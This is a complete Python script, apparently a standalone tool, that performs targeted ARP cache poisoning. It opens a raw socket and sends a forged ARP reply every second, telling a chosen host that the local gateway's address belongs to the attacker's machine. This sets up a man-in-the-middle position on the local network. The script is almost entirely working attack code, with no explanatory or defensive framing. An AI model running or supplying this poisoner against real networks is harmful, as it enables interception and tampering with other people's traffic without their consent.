#!/usr/bin/env python3
import socket
import struct
import time
import sys
import signal

IFACE = "eth1"
TARGET_IP = sys.argv[1] if len(sys.argv) > 1 else "192.168.28.15"
TARGET_MAC_HEX = sys.argv[2].replace(":", "").lower() if len(sys.argv) > 2 else "3c55db6ef175"
GATEWAY_IP = "192.168.28.1"
HOST_MAC_HEX = "000fc923fd85"

running = True

def sig_handler(sig, frame):
    global running
    print("\n[!] Stopping ARP poisoner...")
    running = False

signal.signal(signal.SIGINT, sig_handler)
signal.signal(signal.SIGTERM, sig_handler)

try:
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((IFACE, 0))
except Exception as e:
    print(f"Error opening raw socket: {e}")
    sys.exit(1)

dst_mac = bytes.fromhex(TARGET_MAC_HEX)
src_mac = bytes.fromhex(HOST_MAC_HEX)
gateway_ip_bytes = socket.inet_aton(GATEWAY_IP)
target_ip_bytes = socket.inet_aton(TARGET_IP)

# Ethernet header: dst (6), src (6), type (2 = 0x0806 ARP)
eth_header = dst_mac + src_mac + b"\x08\x06"
# ARP reply: hw 1, proto 0x0800, hw len 6, proto len 4, opcode 2 (reply)
arp_packet = (
    struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2)
    + src_mac
    + gateway_ip_bytes
    + dst_mac
    + target_ip_bytes
)

packet = eth_header + arp_packet

print(f"[*] Starting targeted ARP poison: telling {TARGET_IP} ({TARGET_MAC_HEX}) that {GATEWAY_IP} is at {HOST_MAC_HEX}...")
count = 0
while running:
    try:
        s.send(packet)
        count += 1
        if count % 10 == 0:
            print(f"[+] Sent {count} ARP replies to {TARGET_IP}")
        time.sleep(1)
    except Exception as e:
        print(f"Send error: {e}")
        time.sleep(1)

print("[✓] ARP poisoner stopped.")
